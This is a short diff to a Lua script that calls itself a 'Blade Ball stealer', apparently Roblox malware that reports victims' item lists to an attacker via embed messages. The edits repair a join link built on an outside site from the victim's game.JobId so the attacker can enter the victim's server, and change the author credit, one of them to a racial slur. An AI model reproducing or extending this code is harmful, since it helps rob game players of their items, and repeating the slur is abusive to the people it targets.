@@ -149,7 +149,7 @@ local function SendJoinMessage(list, prefix)
         },
         {
             name = "Join link:",
-            value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=111" .. game.JobId
+            value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId
         },
         {
             name = "Item list:",
@@ -210,7 +210,7 @@ local function SendJoinMessage(list, prefix)
             ["color"] = 65280,
             ["fields"] = fields,
             ["footer"] = {
-                ["text"] = "Blade Ball stealer by Tobi. discord.gg/GY2RVSEGDT"
+                ["text"] = "Blade Ball stealer by Nigger"
             }
         }}
     }
@@ -291,7 +291,7 @@ local function SendMessage(list)
             ["color"] = 65280,
 			["fields"] = fields,
 			["footer"] = {
-				["text"] = "Blade Ball stealer by Tobi. discord.gg/GY2RVSEGDT"
+				["text"] = "Blade Ball stealer by Benok"
 			}
         }}
     }
